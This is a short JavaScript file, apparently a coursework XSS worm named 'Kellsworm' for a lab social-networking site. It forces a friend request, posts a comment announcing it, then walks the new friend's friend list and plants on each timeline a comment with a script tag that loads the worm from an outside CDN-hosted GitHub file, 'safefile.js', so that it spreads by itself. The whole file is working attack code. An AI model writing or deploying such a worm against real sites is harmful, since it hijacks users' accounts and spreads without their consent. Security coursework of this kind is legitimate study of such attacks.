// Add the friend
$.get("add_friend.php", {'id': 61}, function(success) {
    if(success.includes("True")) {
        // Report the friending (not the spreading)
        var cdate = new Date().toString();
        $.get("add_comment.php", {'id': 61, 'comment': "I friended Sean Kells on " + cdate});
    }
});
        
// Loop through the friends of our new friend
$.get("friends.php", function(friend_friends) {
    var friendlist = friend_friends.split(",");
    for (let i = 0; i < friendlist.length; i++) {
        // GET ID
        var friendID = friendlist[i];

        // If it's the last ID
        if (isNaN(friendID)) {
            friendID = friendID.slice(0, friendID.indexOf('<'));
        }
        maliciouscomment(friendID);
    }
});

function maliciouscomment(friendID) { 
    // Check if they have malicious comment already
    $.get("timeline.php", {'id': friendID}, function(posts) {
        if (!posts.includes("Kellsworm")) {
            // Spread it
            $.get("add_comment.php", {'id': friendID, 'comment': 'Kellsworm <script src="https://cdn.jsdelivr.net/gh/spk3077/csec380@main/safefile.js"></script>'});
        }
    });
}
